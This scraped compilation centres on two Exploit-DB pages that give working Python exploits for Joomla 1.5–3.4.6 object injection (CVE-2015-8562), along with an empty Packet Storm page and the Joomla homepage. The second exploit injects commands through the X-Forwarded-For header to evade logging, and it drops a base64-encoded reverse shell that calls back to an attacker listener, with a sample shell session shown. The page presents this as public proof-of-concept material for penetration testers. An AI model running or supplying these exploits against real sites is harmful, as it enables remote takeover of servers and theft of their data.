=== Content from www.exploit-db.com_f05120d9_20250126_025526.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Joomla! 1.5 < 3.4.5 - Object Injection Remote Command Execution

#### EDB-ID:

###### 38977

#### CVE:

###### [2015-8562](https://nvd.nist.gov/vuln/detail/CVE-2015-8562)

---

**EDB Verified:**

#### Author:

###### [Sec-1](/?author=8430)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2015-12-15

---

**Vulnerable App:**

```
'''
   Simple PoC for Joomla Object Injection.
   Gary @ Sec-1 ltd
   http://www.sec-1.com/
'''

import requests #  easy_install requests

def get_url(url, user_agent):

    headers = {
    'User-Agent': user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, headers=headers,cookies=cookies)
    return response

def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))

    return encoded[:-1]

def generate_payload(php_payload):

    php_payload = "eval({0})".format(php_str_noquotes(php_payload))

    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

    return exploit_template

pl = generate_payload("system('touch /tmp/fx');")

print get_url("http://172.31.6.242/", pl)

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from packetstormsecurity.com_e3bdeb2f_20250124_185655.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.joomla.org_d106d185_20250126_025527.html ===


* Joomla!®
  + About us
  + [Joomla Home](https://www.joomla.org)
  + [What is Joomla?](https://www.joomla.org/about-joomla.html)
  + [Benefits & Features](https://www.joomla.org/core-features.html)
  + [Project & Leadership](https://www.joomla.org/about-joomla/the-project.html)
  + [Trademark & Licensing](https://tm.joomla.org)
  + [The Joomla Foundation](https://joomlafoundation.org)
  + Support us
  + [Contribute](https://www.joomla.org/contribute-to-joomla.html)
  + [Sponsor](https://www.joomla.org/sponsor.html)
  + [Partner](https://www.joomla.org/about-joomla/partners.html)
  + [Shop](https://shop.joomla.org)
* Download & Extend
  + [Downloads](https://downloads.joomla.org)
  + [Extensions](https://extensions.joomla.org)
  + [Languages](https://community.joomla.org/translations.html)
  + [Get a free site](https://launch.joomla.org)
  + [Get a domain](https://domains.joomla.org)
* Discover & Learn
  + [Documentation](https://docs.joomla.org)
  + [Training](https://community.joomla.org/joomla-training.html)
  + [Certification](https://certification.joomla.org)
  + [Site Showcase](https://showcase.joomla.org)
  + [Announcements](https://www.joomla.org/announcements.html)
  + [Blogs](https://community.joomla.org/blogs.html)
  + [Magazine](https://magazine.joomla.org)
* Community & Support
  + [Community Portal](https://community.joomla.org)
  + [Events](https://community.joomla.org/events.html)
  + [User Groups](https://community.joomla.org/user-groups.html)
  + [Forum](https://forum.joomla.org)
  + [Service Providers Directory](https://community.joomla.org/service-providers-directory.html)
  + [Volunteers Portal](https://volunteers.joomla.org)
  + [Vulnerable Extensions List](https://extensions.joomla.org/vulnerable-extensions/vulnerable/)
* Developer Resources
  + [Developer Network](https://developer.joomla.org)
  + [Security Centre](https://developer.joomla.org/security.html)
  + [Issue Tracker](https://issues.joomla.org)
  + [GitHub](https://github.com/joomla)
  + [API Documentation](https://api.joomla.org)
  + [Joomla! Framework](https://framework.joomla.org)

Search

# [Joomla!](/)

[Download](https://downloads.joomla.org/)

[Launch](https://launch.joomla.org)

* [Home](/)
* [About Joomla!](/about-joomla.html)
* [Benefits & Features](/core-features.html)
* [Joomla! 5](https://5.joomla.org/)
* [News](/announcements.html)
* [Contribute](/contribute-to-joomla.html)
* [Press Enquiries](/media-contact.html)

## The Flexible Platform Empowering Website Creators

Joomla! is an award-winning content management system (CMS), which enables you to build web sites and powerful online applications.

 [Download Joomla!](https://downloads.joomla.org "Download Joomla!")
### Download Joomla!

Download and Install Joomla! in your own server or development environment.

[Download Joomla! →](https://downloads.joomla.org "Download Joomla!")

[Use launch.joomla.org](https://launch.joomla.org "Free hosted Joomla! website")
### Use Joomla!

Spin up a free and fully functional Joomla website on launch.joomla.org.

[Launch Joomla! →](https://launch.joomla.org "Free hosted Joomla! website")

 [Joomla! Training](https://training.joomla.org/ "Joomla! Training")
### Learn Joomla!

Learn how to manage a Joomla website with free video training classes.

[Learn Joomla! →](https://training.joomla.org/ "Joomla! Training")

## Joomla! Announcements

### [Joomla 5.2.3 Security & Bugfix Release](/announcements/release-news/5919-joomla-5-2-3-security-bugfix-release.html)

Let’s celebrate! The Joomla! Project is pleased to announce the release of Joomla 5.2.3 and Joomla 4.4.10. This is a security and bug fix release for the 5.x and 4.x series of Joomla.

[Read more …](/announcements/release-news/5919-joomla-5-2-3-security-bugfix-release.html)

### [Joomla 5.2.2 Security & Bugfix Release](/announcements/release-news/5918-joomla-5-2-2-security-bugfix-release.html)

Let’s celebrate! The Joomla! Project is pleased to announce the release of Joomla 5.2.2. This is a security and bug fix release for the 5.x series of Joomla.

[Read more …](/announcements/release-news/5918-joomla-5-2-2-security-bugfix-release.html)

## Why Joomla?

Hundreds of developers have been improving Joomla! since the first version was released in 2005. This immense effort has made Joomla! very popular, easy to use, stable and secure.

Joomla! has thousands of free extensions and templates allowing you to customize your site to fit your specific needs.

[Learn more about Joomla! 5](https://5.joomla.org "Discover Joomla! 5.x")

## Benefits & Features

Search Engine Friendly

Mobile Friendly

Unlimited Design

Multilingual

Flexible & Fully Extensible

Multi-User Permission Levels

[See benefits & features](/core-features.html "Joomla! Features")

## Announcements

### Development News

#### [Your first glimpse at Joomla! 5.3.0 Alpha3](https://developer.joomla.org/news/957-your-first-glimpse-at-joomla-5-3-0-alpha3.html)

January 21, 2025 by Tom van der Laan
The Joomla! Project is pleased to announce the availability of Joomla 5.3 Alpha 3 for testing.

#### [Your first glimpse at Joomla! 5.3.0 Alpha2](https://developer.joomla.org/news/953-your-first-glimpse-at-joomla-5-3-0-alpha2.html)

December 24, 2024 by Tom van der Laan
The Joomla! Project is pleased to announce the availability of Joomla 5.3 Alpha 2 for testing.

### Community News

#### [Call for Candidate Manifestos - Group 2 (2025) - Elections](https://community.joomla.org/blogs/leadership/call-for-manifestos-group2-2025.html)

January 6, 2025 by [DOT] marzo [AT] community [DOT] joomla [DOT] org (Luca Marzo
Elections for the Board of Open Source Matters, Inc. occur twice a year at 6 monthly intervals to ensure continuity of the board by electing half...

#### [Invitation to the OSM Semi-Annual Members Meeting - December 2024](https://community.joomla.org/blogs/leadership/invitation-to-the-osm-semi-annual-members-meeting-december-2024.html)

December 6, 2024 by [DOT] marzo [AT] community [DOT] joomla [DOT] org (Luca Marzo
To all the Members of Open Source Matters, Inc.
It is with great pleasure that I invite you to attend the Semi-Annual Members Meeting of Open...

### Team Reports

#### [Notes meeting 01/13/25](https://volunteers.joomla.org/teams/joomla-enhancement-development-team/reports/2049-notes-meeting-01-13-25)

January 21, 2025 by Private Profile fe0b0e33
Present: Christiane, Martin, Emmanuel, Phil, Benjamin, Shirielle, Olivier
Objective:
Update on projects.
Item discussed:
Joomla Health...

#### [Production Dept. Meeting January 7 2025](https://volunteers.joomla.org/departments/production/reports/2048-production-dept-meeting-january-7-2025)

January 13, 2025 by Christiane Maier-Stadtherr
Duration: 30 Mins.AttendeesSigrid Gramlinger, Benkamin Trenkle, Christiane Maier-Stadtherr, David Jardin, Hannes Papenberg, Martin Kopp, Olivier...

## Upcoming Events

![joomla events](/images/homepage/joomla-events-1.jpg)

[More events](https://community.joomla.org/events.html "Joomla! Events")

## Joomla! Means Community

Joomla! is the only major CMS that is built entirely by volunteers from all over the world. We have a strong community bond and all take pleasure in building something that has a large global impact. If you are interested in volunteering please head over to the volunteer portal.

[Get involved](https://volunteers.joomla.org "Contribute to Joomla!")

[141 +
Million
Downloads](https://downloads.joomla.org "Download Joomla")

[10 +
Thousand
Extensions &
Templates](https://extensions.joomla.org "Joomla Extension Directory")

[2 +
Million
Web Sites](https://showcase.joomla.org "Joomla Showcase")

[1500 +
Volunteers](https://volunteers.joomla.org "Download Joomla")

[550 +
Thousand
Lines of Code](https://github.com/joomla/joomla-cms "Joomla CMS on GitHub")

[76
Languages](https://community.joomla.org/translations/joomla-3-translations.html "Joomla language Packs")

## Our Sponsors & Partners

Thanks to the following companies for their support of the Joomla Project

[![elasticemail](/images/homepage/elasticemail-hp.svg)](/about-joomla/partners.html#elasticemail)
[![Scalahosting](/images/homepage/scalahosting.svg)](/current-sponsors.html#scalahosting)
[![cloudaccess](/images/homepage/cloudaccess.svg?=n)](/about-joomla/partners.html#cloudaccess)
[![crowdin](/images/homepage/crowdin.svg)](/about-joomla/partners.html#crowdin)
[![reporturi](/images/homepage/reporturi.svg)](/about-joomla/partners.html#reporturi)

[Joomla Sponsors](/current-sponsors.html "Joomla! sponsors") [Sponsor us!](/sponsorship-application.html "Sponsor Joomla") [Joomla Partners](/about-joomla/partners.html "Joomla! partners")

Stay up to date with the latest news and information about Joomla

[Subscribe to Joomla Newsletters](https://community.joomla.org/general-newsletter.html "Joomla Newsletters")

---

* [Joomla! on Twitter](https://twitter.com/joomla "Joomla! on Twitter")
* [Joomla! on Facebook](https://www.facebook.com/joomla "Joomla! on Facebook")
* [Joomla! on YouTube](https://www.youtube.com/user/joomla "Joomla! on YouTube")
* [Joomla! on LinkedIn](https://www.linkedin.com/company/joomla "Joomla! on LinkedIn")
* [Joomla! on Pinterest](https://www.pinterest.com/joomla "Joomla! on Pinterest")
* [Joomla! on Instagram](https://www.instagram.com/joomlaofficial/ "Joomla! on Instagram")
* [Joomla! on GitHub](https://github.com/joomla "Joomla! on GitHub")

* [Home](https://www.joomla.org)
* [About](https://www.joomla.org/about-joomla.html)
* [Community](https://community.joomla.org)
* [Forum](https://forum.joomla.org)
* [Extensions](https://extensions.joomla.org)
* [Services](https://community.joomla.org/service-providers-directory.html)
* [Docs](https://docs.joomla.org)
* [Developer](https://developer.joomla.org)
* [Shop](https://community.joomla.org/the-joomla-shop.html)

* [Accessibility Statement](https://www.joomla.org/accessibility-statement.html)
* [Privacy Policy](https://www.joomla.org/privacy-policy.html)
* [Cookie Policy](https://www.joomla.org/cookie-policy.html)
* [Sponsor Joomla! with $5](https://community.joomla.org/sponsorship-campaigns.html)
* [Help Translate](https://joomla.crowdin.com)
* [Report an Issue](https://github.com/joomla/joomla-websites/issues/new?title=[joomla.org]%20&body=Please%20describe%20the%20problem%20or%20your%20issue)
* [Log in](/login.html?task=login.login&profile=identity-provider)

© 2005 - 2025 [Open Source Matters, Inc.](https://opensourcematters.org) All Rights Reserved.

[![Rochen](https://cdn.joomla.org/rochen/rochen_footer_logo_white.svg)](https://www.rochen.com/joomla-hosting)
[Joomla! Hosting by Rochen](https://www.rochen.com/joomla-hosting)

Close

We have detected that you are using an ad blocker. The Joomla! Project relies on revenue from these advertisements so please consider disabling the ad blocker for this domain.



=== Content from www.exploit-db.com_4e1ac62b_20250124_185706.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Joomla! 1.5 < 3.4.6 - Object Injection 'x-forwarded-for' Header Remote Code Execution

#### EDB-ID:

###### 39033

#### CVE:

###### [2015-8566](https://nvd.nist.gov/vuln/detail/CVE-2015-8566) [2015-8562](https://nvd.nist.gov/vuln/detail/CVE-2015-8562)

---

**EDB Verified:**

#### Author:

###### [Andrew McNicol](/?author=8433)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2015-12-18

---

**Vulnerable App:**

```
#!/usr/bin/env python

# Exploit Title: Joomla 1.5 - 3.4.6 Object Injection RCE X-Forwarded-For header
# Date: 12/17/2015
# Exploit Author: original - Gary@ Sec-1 ltd, Modified - Andrew McNicol BreakPoint Labs (@0xcc_labs)
# Vendor Homepage: https://www.joomla.org/
# Software Link: http://joomlacode.org/gf/project/joomla/frs/
# Version: Joomla 1.5 - 3.4.6
# Tested on: Ubuntu 14.04.2 LTS (Joomla! 3.2.1 Stable)
# CVE : CVE-2015-8562

'''
    Joomla 1.5 - 3.4.6 Object Injection RCE - CVE-2015-8562
    PoC for CVE-2015-8562 to spawn a reverse shell or automate RCE

    Original PoC from Gary@ Sec-1 ltd (http://www.sec-1.com):
    https://www.exploit-db.com/exploits/38977/

    Vulnerability Info, Exploit, Detection:
    https://breakpoint-labs.com/joomla-rce-cve-2015-8562/

    Exploit modified to use "X-Forwarded-For" header instead of "User-Agent" to avoid default logged to access.log

    Usage - Automate Blind RCE:
    python joomla-rce-2-shell.py -t http://192.168.1.139/ --cmd
    $ touch /tmp/newhnewh

    Usage - Spawn Reverse Shell using Pentestmonkey's Python one-liner and netcat listener on local host:
    python joomla-rce-2-shell.py -t http://192.168.1.139/ -l 192.168.1.119 -p 4444
    [-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http://192.168.1.139/
    [-] Uploading python reverse shell with LHOST:192.168.1.119 and LPORT:4444
    <Response [200]>
    [+] Spawning reverse shell....
    <Response [200]>

    Listening on [0.0.0.0] (family 0, port 4444)
    $ python -c "import pty;pty.spawn('/bin/bash')"
    www-data@ubuntu:/$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@ubuntu:/$

'''

import requests
import subprocess
import argparse
import sys
import base64

# Heavy lifting from PoC author Gary@ Sec-1 ltd (http://www.sec-1.com)
def get_url(url, user_agent):

    headers = {
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3', # Change default UA for Requests
    'x-forwarded-for': user_agent   # X-Forwarded-For header instead of UA
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, headers=headers,cookies=cookies)
    return response

def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))

    return encoded[:-1]

def generate_payload(php_payload):

    php_payload = "eval({0})".format(php_str_noquotes(php_payload))

    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

    return exploit_template

def main():
    parser = argparse.ArgumentParser(prog='cve-2015-8562.py', description='Automate blind RCE for Joomla vuln CVE-2015-8652')
    parser.add_argument('-t', dest='RHOST', required=True, help='Remote Target Joomla Server')
    parser.add_argument('-l', dest='LHOST', help='specifiy local ip for reverse shell')
    parser.add_argument('-p', dest='LPORT', help='specifiy local port for reverse shell')
    parser.add_argument('--cmd', dest='cmd', action='store_true', help='drop into blind RCE')

    args = parser.parse_args()

    if args.cmd:
        print "[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}".format(args.RHOST)
        print "[-] Dropping into shell-like environment to perform blind RCE"
        while True:
            command = raw_input('$ ')
            cmd_str = "system('{}');".format(command)
            pl = generate_payload(cmd_str)
            print get_url(args.RHOST, pl)

    # Spawn Reverse Shell using Netcat listener + Python shell on victim
    elif args.LPORT and args.LPORT:
        connection = "'{}', {}".format(args.LHOST, args.LPORT)

        # pentestmonkey's Python reverse shell one-liner:
        shell_str = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('''+connection+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''
        # Base64 encoded the Python reverse shell as some chars were messing up in the exploit
        encoded_comm = base64.b64encode(shell_str)
        # Stage 1 payload Str
        payload = "echo {} | base64 -d > /tmp/newhnewh.py".format(encoded_comm)
        print "[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}".format(args.RHOST)
        print "[-] Uploading python reverse shell with LHOST {} and {}".format(args.LHOST, args.LPORT)
        # Stage 1: Uploads the Python reverse shell to "/tmp/newhnewh.py"
        pl = generate_payload("system('"+payload+"');")
        print get_url(args.RHOST, pl)
        # Spawns Shell listener using netcat on LHOST
        listener = subprocess.Popen(args=["gnome-terminal", "--command=nc -lvp "+args.LPORT])
        print "[+] Spawning reverse shell...."
        # Stage 2: Executes Python reverse shell back to LHOST:LPORT
        pl = generate_payload("system('python /tmp/newhnewh.py');")
        print get_url(args.RHOST, pl)
    else:
        print '[!] missing arguments'
        parser.print_help()

if __name__ == "__main__":
    main()

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
